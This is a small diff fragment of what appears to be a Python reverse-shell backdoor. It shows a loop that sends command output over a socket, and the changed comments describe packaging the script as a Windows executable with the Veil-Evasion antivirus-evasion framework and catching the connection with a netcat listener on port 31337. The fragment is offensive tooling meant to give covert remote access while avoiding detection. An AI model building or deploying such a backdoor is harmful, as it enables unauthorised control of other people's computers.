@@ -20,7 +20,7 @@ while 1:
     # print(result)
     sockobj.send(result)
 
-    # Veil-Evasion make .py to .exe
-    # auxilary/pyinstaller-wrapper
-    # connect to nc
-    #   nc -L -p 31337 -v
+# Veil-Evasion make .py to .exe
+# auxilary/pyinstaller-wrapper
+# connect to nc (Windows)
+#   nc -L -p 31337 -v
